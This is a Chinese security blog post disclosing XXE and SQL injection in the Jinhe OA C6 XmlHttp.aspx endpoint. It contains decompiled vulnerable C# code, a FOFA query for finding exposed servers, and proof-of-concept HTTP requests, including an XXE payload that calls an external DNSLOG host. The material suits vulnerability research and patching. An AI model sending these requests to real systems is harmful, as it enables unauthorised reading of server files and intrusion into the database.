---
title: "金和OA Jhsoft.Web.appraise/XmlHttp.aspx XXE+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-appraise-XmlHttp-xxe-sqli.html
asset_dir: assets/金和oa-jhsoft.web.appraisexmlhttp.aspx-xxe+sql注入漏洞
---

# 金和OA Jhsoft.Web.appraise/XmlHttp.aspx XXE+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/11/2 13:26
- 416浏览
- [0评论](#comment)
- 22分钟阅读

深入探索

网络安全课程

恶意软件分析工具

SQL注入检测工具

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `Jhsoft.Web.appraise/XmlHttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 `Jhsoft.Web.appraise/XmlHttp.aspx` 在 `bin` 目录下查找 `JHSoft.Web.Appraise.dll` 将其进行反编译后找到 **XmlHttp** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.Load(this.Request.InputStream);
  string innerText = xmlDocument.SelectSingleNode("//root//Flag").InnerText;
  if (innerText == null || !string.op_Equality(innerText, "GetSubDeptsByID"))
    return;
  this.GetSubDeptsByID(Convert.ToString(xmlDocument.DocumentElement.SelectSingleNode("//root//deptid").InnerText));
}
```

深入探索

安全研究报告

漏洞扫描器

物流软件安全

请求内容直接使 `XmlDocument.LoadXml` 解析，造成[XXE](https://mrxn.net/tag/XXE)漏洞。

同时该点还存在[sql注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，因为`deptid`节点的值被直接带入`GetSubDeptsByID`方法

```
private void GetSubDeptsByID(string deptID)
{
  DataTable firstSubDeptByDeptId = new Role().GetFirstSubDeptByDeptID(deptID);
```

跟进 `GetFirstSubDeptByDeptID`

```
public DataTable GetFirstSubDeptByDeptID(string deptID)
{
  DataTable firstSubDeptByDeptId = (DataTable) null;
  StringBuilder stringBuilder = new StringBuilder();
  stringBuilder.Append("select  a.DeptID, a.DeptName,case when exists(select * from dbo.department where deptparentid=a.deptid and deptdelflag=0) then 1 else 0 end as haschild ");
  stringBuilder.Append("   from dbo.Department  a left outer join dbo.Sort b on a.DeptID =b.SortObjectID  ");
  stringBuilder.Append($" where  a.deptparentid={deptID} and b.SortType = 'Dept' and a.DeptDelFlag = 0");
  stringBuilder.Append(" order by sortid ");
  try
  {
    firstSubDeptByDeptId = this.ObjDAL.ExecSQLReDataTable(stringBuilder.ToString());
```

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.appraise/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

深入探索

计算机安全

漏洞修复方案

VPN服务

在DNSLOG平台成功收到HTTP请求

代码安全审计

[![金和OA Jhsoft.Web.appraise/XmlHttp.aspx XXE+SQL注入漏洞](images/img-001-5d9754b7ff40.webp)](https://image.mrxn.net/2717331bf52c4dd0a3f322019ceaf880.webp)

## SQL

```
POST /c6/Jhsoft.Web.appraise/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<root>
  <Flag>GetSubDeptsByID</Flag>
  <deptid>SQLI_POC</deptid>
</root>
```

[![金和OA Jhsoft.Web.appraise/XmlHttp.aspx XXE+SQL注入漏洞](images/img-002-ae43573e0812.webp)](https://image.mrxn.net/4ac0d67b12394283a9ffd909d2d5a762.webp)

成功延时 5 秒

漏洞扫描服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)
- [5.1.XXE](#toc-5-1-)
- [5.2.SQL](#toc-5-2-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
